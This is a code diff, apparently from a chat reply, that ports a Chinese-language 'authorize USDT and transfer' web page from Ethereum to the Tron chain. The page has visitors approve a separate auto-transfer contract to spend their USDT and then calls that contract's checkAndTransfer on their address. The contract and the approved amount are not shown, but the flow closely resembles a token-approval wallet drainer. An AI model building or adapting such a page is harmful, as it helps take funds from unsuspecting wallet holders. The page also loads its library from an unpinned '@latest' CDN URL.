@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>授权USDT并转账</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
 </head>
 <body>
 <h1>授权USDT并转账</h1>
@@ -51,13 +51,13 @@
         {"inputs":[],"name":"usdtToken","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}
     ];
 
-    let web3;
+    let tronWeb;
 
     async function connectWallet() {
-        if (typeof window.ethereum !== 'undefined') {
-            web3 = new Web3(window.ethereum);
+        if (typeof window.tronWeb !== 'undefined') {
+            tronWeb = window.tronWeb;
             try {
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                await tronWeb.trx.getBalance(tronWeb.defaultAddress.base58);
                 document.getElementById('connectWalletBtn').style.display = 'none';
                 document.getElementById('approveBtn').style.display = 'block';
             } catch (error) {
@@ -65,18 +65,16 @@
                 alert('连接钱包失败!');
             }
         } else {
-            alert('请安装欧易钱包插件!');
+            alert('请安装TronLink钱包!');
         }
     }
 
     document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
 
     document.getElementById('approveBtn').addEventListener('click', async () => {
-        const accounts = await web3.eth.getAccounts();
-        const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);
+        const usdtContract = await tronWeb.contract(usdtAbi, usdtContractAddress);
         usdtContract.methods.approve(autoTransferContractAddress, approveAmount).send({
-            from: accounts[0],
-            gas: 200000
+            feeLimit: 100000000
         }).then(() => {
             document.getElementById('result').innerText = '授权成功';
             document.getElementById('approveBtn').style.display = 'none';
@@ -88,18 +86,17 @@
     });
 
     document.getElementById('transferBtn').addEventListener('click', async () => {
-        const accounts = await web3.eth.getAccounts();
-        const contract = new web3.eth.Contract(autoTransferAbi, autoTransferContractAddress);
-        await contract.methods.checkAndTransfer(accounts[0]).send({
-            from: accounts[0],
-            gas: 200000
+        const contract = await tronWeb.contract(autoTransferAbi, autoTransferContractAddress);
+        const userAddress = tronWeb.defaultAddress.base58;
+        await contract.methods.checkAndTransfer(userAddress).send({
+            feeLimit: 100000000,        callValue: 0
         }).then(() => {
             document.getElementById('result').innerText = '转账成功';
         }).catch((error) => {
             console.error(error);
             document.getElementById('result').innerText = '转账失败';
         });
-    });
-</script>
+    });</script>
 </body>
 </html>
+```
